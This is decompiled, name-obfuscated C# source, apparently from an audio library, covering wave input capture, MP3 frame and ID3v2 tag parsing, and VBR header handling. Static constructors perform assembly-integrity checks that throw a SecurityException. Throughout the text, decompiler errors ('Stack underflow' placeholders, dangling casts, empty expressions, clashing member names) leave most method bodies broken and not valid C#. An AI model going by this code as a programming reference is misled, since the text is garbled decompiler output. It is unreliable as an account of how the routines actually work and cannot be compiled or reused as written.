				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0001._0006> DataAvailable
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0001._0006> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0001._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0001._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0001._0006> value2 = (EventHandler<global::_0001._0006>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public event EventHandler<global::_0003._0003> RecordingStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0006()
		{
			this._0001 = new AutoResetEvent(initialState: false);
			this._0001 = SynchronizationContext.Current;
			DeviceNumber = 0;
			WaveFormat = new global::_0005._0005(8000, 16, 1);
			BufferMilliseconds = 100;
			NumberOfBuffers = 3;
		}

		private void _0003()
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_007e: Stack underflow*/).BufferMilliseconds;
			int num = ((_0006)/*Error near IL_000e: Stack underflow*/).WaveFormat._0002;
			int num2 = /*Error near IL_0014: Stack underflow*/* num / 1000;
			if (num2 % WaveFormat.BlockAlign != 0)
			{
				num2 -= num2 % WaveFormat.BlockAlign;
			}
			this._0001 = new global::_0011._0005[NumberOfBuffers];
			for (int i = 0; i < this._0001.Length; i++)
			{
				this._0001[i] = new global::_0011._0005(this._0001, num2);
			}
		}

		private void _0004()
		{
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0006)/*Error near IL_0068: Stack underflow*/);
			global::_0011._0018._0001(global::_0011._0018._0001(out ((_0006)/*Error near IL_000b: Stack underflow*/)._0001, _0099._008E_0004(DeviceNumber), WaveFormat, _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(this._0001)), IntPtr.Zero, _0008._0001._0003), global::_0080._0014._0001(107390053));
			_0003();
		}

		public void _0001()
		{
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			if (((_0006)/*Error near IL_0009: Stack underflow*/)._0001)
			{
				global::_0080._0014._0001(107390068);
				new InvalidOperationException((string?)/*Error near IL_0066: Stack underflow*/);
				throw /*Error near IL_0015: Stack underflow*/;
			}
			_0004();
			global::_0011._0018._0001(global::_0011._0018._0001(this._0001), global::_0080._0014._0001(107390043));
			this._0001 = true;
			_0097_0002._000E_0006(delegate
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0006)/*Error near IL_000d: Stack underflow*/);
			}, null);
		}

		public void _0002()
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 2
			//IL_003f: Incompatible stack heights: 0 vs 1
			((_0006)/*Error near IL_000a: Stack underflow*/)._0001 = false;
			_ = global::_001B._007E_0084_0003;
			AutoResetEvent autoResetEvent = ((_0006)/*Error near IL_0016: Stack underflow*/)._0001;
			/*Error near IL_003f: Stack underflow*/(autoResetEvent);
			global::_0011._0018._0001(global::_0011._0018._0001(this._0001), global::_0080._0014._0001(107389994));
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				if (((_0006)/*Error near IL_000d: Stack underflow*/)._0001)
				{
					((_0006)/*Error near IL_0016: Stack underflow*/)._0002();
				}
				global::_0011._0018._0001(this);
			}
		}

		public void _0005()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0006)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0005();
		}

		[CompilerGenerated]
		private void _0001(object _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0006)/*Error near IL_000d: Stack underflow*/);
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal interface _0008 : IDisposable
	{
		global::_0005._0005 WaveFormat { get; set; }

		event EventHandler<global::_0001._0006> DataAvailable;

		event EventHandler<global::_0003._0003> RecordingStopped;

		void _0001();

		void _0002();
	}
}
namespace _0014
{
	internal sealed class _0004
	{
		private long m__0001;

		private long _0002;

		private byte[] m__0001;

		public byte[] RawData => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		internal static Stream _0001(IEnumerable<KeyValuePair<string, string>> _0002)
		{
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b8: Incompatible stack heights: 0 vs 1
			new List<byte[]>();
			List<byte[]> list = (List<byte[]>)/*Error near IL_00b2: Stack underflow*/;
			foreach (KeyValuePair<string, string> item in (IEnumerable<KeyValuePair<string, string>>)/*Error near IL_0014: Stack underflow*/)
			{
				list.Add(global::_0011._0018._0001(item.Key, item.Value));
			}
			byte[] array = global::_0011._0018._0001((IEnumerable<byte[]>)list);
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(array, 0, array.Length);
			foreach (byte[] item2 in list)
			{
				memoryStream.Write(item2, 0, item2.Length);
			}
			memoryStream.Position = 0L;
			return memoryStream;
		}

		internal _0004(Stream _009F_000E)
		{
			this.m__0001 = _009F_000E.Position;
			BinaryReader binaryReader = new BinaryReader(_009F_000E);
			byte[] array = binaryReader.ReadBytes(10);
			if (array.Length >= 3 && array[0] == 73 && array[1] == 68 && array[2] == 51)
			{
				if ((array[5] & 0x40) == 64)
				{
					byte[] array2 = binaryReader.ReadBytes(4);
					_ = array2[0] * 2097152 + array2[1] * 16384 + array2[2] * 128;
					_ = array2[3];
				}
				int num = array[6] * 2097152;
				num += array[7] * 16384;
				num += array[8] * 128;
				num += array[9];
				binaryReader.ReadBytes(num);
				if ((array[5] & 0x10) == 16)
				{
					binaryReader.ReadBytes(10);
				}
				_0002 = _009F_000E.Position;
				_009F_000E.Position = this.m__0001;
				this.m__0001 = binaryReader.ReadBytes((int)(_0002 - this.m__0001));
				return;
			}
			_009F_000E.Position = this.m__0001;
			throw new FormatException(_0080._0014._0001(107390009));
		}
	}
}
namespace _0001
{
	internal interface _0004 : IDisposable
	{
		global::_0005._0005 OutputFormat { get; }

		int _0001(global::_0005._0003 _0002, byte[] _0003, int _0004);

		void _0001();
	}
}
namespace _0005
{
	internal sealed class _0003
	{
		internal static readonly int[,,] _0001;

		internal static readonly int[,] _0001;

		internal static readonly int[] _0001;

		internal static readonly int[] _0002;

		internal static readonly int[] _0003;

		private const int _0001 = 16384;

		[CompilerGenerated]
		private int _0002;

		[CompilerGenerated]
		private int m__0003;

		[CompilerGenerated]
		private int _0004;

		[CompilerGenerated]
		private byte[] _0001;

		[CompilerGenerated]
		private global::_0004._0006 _0001;

		[CompilerGenerated]
		private global::_0001._0005 _0001;

		[CompilerGenerated]
		private ChannelMode _0001;

		[CompilerGenerated]
		private int _0005;

		[CompilerGenerated]
		private int _0006;

		[CompilerGenerated]
		private int _0007;

		[CompilerGenerated]
		private bool _0001;

		[CompilerGenerated]
		private bool _0002;

		[CompilerGenerated]
		private long _0001;

		public int SampleRate
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int FrameLength
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int BitRate
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0004 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public byte[] RawData
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (byte[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0004._0006 MpegVersion
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0004._0006)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0001._0005 MpegLayer
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0001._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public ChannelMode ChannelMode
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (ChannelMode)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int SampleCount
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0005 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int ChannelExtension
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0006;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0006 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int BitRateIndex
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0007;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0007 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public bool Copyright
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public bool CrcPresent
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public long FileOffset
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _0003()
		{
		}

		static _0003()
		{
			//IL_012b: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_0131: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			global::_0005._0003._0001 = new int[2, 3, 15]
			{
				{
					{
						0, 32, 64, 96, 128, 160, 192, 224, 256, 288,
						320, 352, 384, 416, 448
					},
					{
						0, 32, 48, 56, 64, 80, 96, 112, 128, 160,
						192, 224, 256, 320, 384
					},
					{
						0, 32, 40, 48, 56, 64, 80, 96, 112, 128,
						160, 192, 224, 256, 320
					}
				},
				{
					{
						0, 32, 48, 56, 64, 80, 96, 112, 128, 144,
						160, 176, 192, 224, 256
					},
					{
						0, 8, 16, 24, 32, 40, 48, 56, 64, 80,
						96, 112, 128, 144, 160
					},
					{
						0, 8, 16, 24, 32, 40, 48, 56, 64, 80,
						96, 112, 128, 144, 160
					}
				}
			};
			global::_0005._0003._0001 = new int[2, 3]
			{
				{ 384, 1152, 1152 },
				{ 384, 1152, 576 }
			};
			global::_0005._0003._0001 = new int[3] { 44100, 48000, 32000 };
			global::_0005._0003._0002 = new int[3] { 22050, 24000, 16000 };
			global::_0005._0003._0003 = new int[3] { 11025, 12000, 8000 };
		}
	}
}
namespace _0015
{
	internal sealed class _0007 : IDisposable, global::_0001._0004
	{
		private readonly global::_0006._0010 m__0001;

		private readonly global::_0005._0005 m__0001;

		private bool m__0001;

		public global::_0005._0005 OutputFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0007(global::_0005._0005 _0089_008F_0006)
		{
			this.m__0001 = global::_0011._0018._0001(_0089_008F_0006);
			try
			{
				this.m__0001 = new global::_0006._0010(_0089_008F_0006, this.m__0001);
			}
			catch (Exception)
			{
				this.m__0001 = true;
				GC.SuppressFinalize(this);
				throw;
			}
		}

		public int _0001(global::_0005._0003 _0002, byte[] _0003, int _0004)
		{
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107389952);
				_0080._0014._0001(107389975);
				throw new ArgumentNullException((string?)/*Error near IL_0020: Stack underflow*/, (string?)/*Error near IL_0020: Stack underflow*/);
			}
			_0098_0002._000F_0006(_0002.RawData, this.m__0001.SourceBuffer, _0002.FrameLength);
			int num = 0;
			global::_0006._0010 obj = this.m__0001;
			int num2 = _0002.FrameLength;
			int num3 = global::_0011._0018._0001(ref num, obj, num2);
			if (num != _0002.FrameLength)
			{
				throw new InvalidOperationException(_009D._0093_0004(_0080._0014._0001(107390418), num, _0002.FrameLength));
			}
			_0099_0002._0010_0006(this.m__0001.DestBuffer, 0, _0003, _0004, num3);
			return num3;
		}

		public void _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(((_0007)/*Error near IL_0007: Stack underflow*/).m__0001);
		}

		public void _0002()
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			if (!((_0007)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				((_0007)/*Error near IL_0011: Stack underflow*/).m__0001 = true;
				if (((_0007)/*Error near IL_0018: Stack underflow*/).m__0001 != null)
				{
					this.m__0001._0001();
				}
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		protected override void _0003()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0007)/*Error near IL_000e: Stack underflow*/)._0002();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0001
{
	internal enum _0005
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0004
{
	internal enum _0006
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0017
{
	internal sealed class _0007
	{
		[Flags]
		private enum _0001
		{
			_0001 = 1,
			_0002 = 2,
			_0003 = 4,
			_0004 = 8
		}

		private static int[] m__0001;

		internal int _0001 = -1;

		internal int _0002;

		internal int _0003;

		internal int _0004 = -1;

		internal int _0005 = -1;

		internal int _0006 = -1;

		internal global::_0005._0003 _0001;

		public int Frames
		{
			get
			{
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_002c: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/)._0005 == -1)
				{
					return -1;
				}
				_ = ((_0007)/*Error near IL_0013: Stack underflow*/)._0001.RawData;
				return global::_0011._0018._0001(_0003: _0005, _0002: (byte[])/*Error near IL_0020: Stack underflow*/);
			}
			set
			{
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/)._0005 == -1)
				{
					global::_0080._0014._0001(107390309);
					new InvalidOperationException((string?)/*Error near IL_003c: Stack underflow*/);
					throw /*Error near IL_0014: Stack underflow*/;
				}
				global::_0011._0018._0001(this, this._0001.RawData, _0005, value);
			}
		}

		public int Bytes
		{
			get
			{
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_002c: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/)._0006 == -1)
				{
					return -1;
				}
				_ = ((_0007)/*Error near IL_0013: Stack underflow*/)._0001.RawData;
				return global::_0011._0018._0001(_0003: _0006, _0002: (byte[])/*Error near IL_0020: Stack underflow*/);
			}
			set
			{
				//IL_002e: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/)._0005 == -1)
				{
					global::_0080._0014._0001(107390276);
					new InvalidOperationException((string?)/*Error near IL_003c: Stack underflow*/);
					throw /*Error near IL_0014: Stack underflow*/;
				}
				global::_0011._0018._0001(this, this._0001.RawData, _0006, value);
			}
		}

		public int VbrScale => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0005._0003 Mp3Frame => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0007()
		{
		}

		static _0007()
		{
			//IL_00cf: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00d5: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0007.m__0001 = new int[4] { 44100, 48000, 32000, 99999 };
		}
	}
}
namespace _0005
{
	internal enum _0004
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 3,
		_0004 = 4,
		_0005 = 5,
		_0006 = 6,
		_0007 = 20,
		_0008 = 21,
		_000E = 22,
		_000F = 23,
		_0010 = 24,
		_0011 = 30,
		_0012 = 31,
		_0013 = 50,
		_0014 = 51,
		_0015 = 100,
		_0016 = 101
	}
}
namespace _007F
{
	[Flags]
	internal enum _0005
	{
		_0001 = 4,
		_0002 = 0x10,
		_0003 = 0x20
	}
}
namespace _0012
{
	[StructLayout(LayoutKind.Explicit)]
	internal struct _0001
	{
		public const int _0001 = 1;

		public const int _0002 = 2;

		public const int _0003 = 4;

		[FieldOffset(0)]
		public uint _0001;

		[FieldOffset(4)]
		public uint _0002;

		[FieldOffset(4)]
		public uint _0003;

		[FieldOffset(4)]
		public uint _0004;

		[FieldOffset(4)]
		public uint _0005;

		[FieldOffset(4)]
		public byte _0001;

		[FieldOffset(5)]
		public byte _0002;

		[FieldOffset(6)]
		public byte _0003;

		[FieldOffset(7)]
		public byte _0004;

		[FieldOffset(8)]
		public byte _0005;

		[FieldOffset(9)]
		public byte _0006;

		[FieldOffset(10)]
		public byte _0007;

		[FieldOffset(11)]
		public byte _0008;

		[FieldOffset(4)]
		public uint _0006;
	}
}
namespace _007F
{
	[StructLayout(LayoutKind.Sequential)]
	internal sealed class _0006
	{
		public IntPtr _0001;

		public int _0001;

		public int _0002;

		public IntPtr _0002;

		public global::_000E._0004 _0001;

		public int _0003;

		public IntPtr _0003;

		public IntPtr _0004;
	}
}
namespace _000E
{
	[Flags]
	internal enum _0004
	{
		_0001 = 4,
		_0002 = 1,
		_0003 = 8,
		_0004 = 0x10,
		_0005 = 2
	}
}
namespace _001F
{
	internal sealed class _0004 : _007F._0014
	{
		public override global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				//IL_000d: Incompatible stack heights: 0 vs 1
				_ = ((_007F._0014)/*Error near IL_000d: Stack underflow*/).WaveFormat;
				return (global::_0005._0005)/*Error near IL_0005: Stack underflow*/;
			}
			set
			{
				//IL_000f: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				_0080._0014._0001(107390247);
				new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
				throw /*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0004()
			: this(global::_0011._0018._0001())
		{
		}

		public _0004(global::_0010._0019 _008A_008F_0006)
			: base(_008A_008F_0006)
		{
		}

		protected override global::_0005._0012 _0001()
		{
			return global::_0005._0012._0003;
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _007F
{
	internal class _0014 : IDisposable, global::_0013._0008
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0014 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		private const long m__0001 = 10000000L;

		private const long m__0002 = 10000L;

		internal volatile _001F._0014 _0001;

		internal byte[] _0001;

		internal Thread _0001;

		private global::_0007._0014 m__0001;

		internal int _0001;

		internal global::_0005._0005 _0001;

		private bool m__0001;

		internal readonly SynchronizationContext _0001;

		internal readonly bool _0002;

		internal EventWaitHandle _0001;

		private readonly int m__0002;

		[CompilerGenerated]
		internal EventHandler<global::_0001._0006> _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private global::_0003._000F m__0001;

		public global::_0003._000F ShareMode
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0003._000F)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _001F._0014 CaptureState => ((_0014)/*Error near IL_0009: Stack underflow*/)._0001;

		public virtual global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0007: Stack underflow*/)._0001._0001();
